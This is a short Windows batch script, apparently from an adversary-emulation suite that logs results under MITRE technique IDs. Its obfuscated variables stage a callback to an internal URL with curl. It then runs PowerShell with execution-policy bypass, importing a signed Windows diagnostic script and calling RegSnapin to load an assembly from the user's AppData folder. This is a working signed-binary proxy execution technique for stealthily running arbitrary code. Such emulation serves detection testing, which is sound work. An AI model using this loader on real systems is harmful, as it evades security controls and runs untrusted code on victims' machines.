@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\8679\bc9bcbb2
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8679-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=mspaint.txt
SET ewjmdkff=8679
SET wfdne=%APPDATA%\%pudaazx%
SET lbjch=%wfdne%\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_start>> "%lbjch%" 2>nul
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_start>> "%lbjch%" 2>nul
curl -k -s -o nul "%drguvr%"
IF !ERRORLEVEL! EQU 0 (SET res=1&SET err=) ELSE (SET res=0&SET err=curl_failed)
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_complete result=!res!>> "%lbjch%" 2>nul
echo [%DATE% %TIME%][%hlbnp%]: %pudaazx%-%ewjmdkff%-T1218|Signed Binary Proxy Execution=!res!:!err!>> "%lbjch%" 2>nul

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: powershell_exec_start>> "%lbjch%" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin %pjkcpgw%\%syjfr%;[Program.Class]::Dale()"
IF !ERRORLEVEL! EQU 0 (SET res=1&SET err=) ELSE (SET res=0&SET err=assembly_load_failed)
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: powershell_exec_complete result=!res!>> "%lbjch%" 2>nul
echo [%DATE% %TIME%][%hlbnp%]: %pudaazx%-%ewjmdkff%-T1218.010|Regsvr32=!res!:!err!>> "%lbjch%" 2>nul

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_end>> "%lbjch%" 2>nul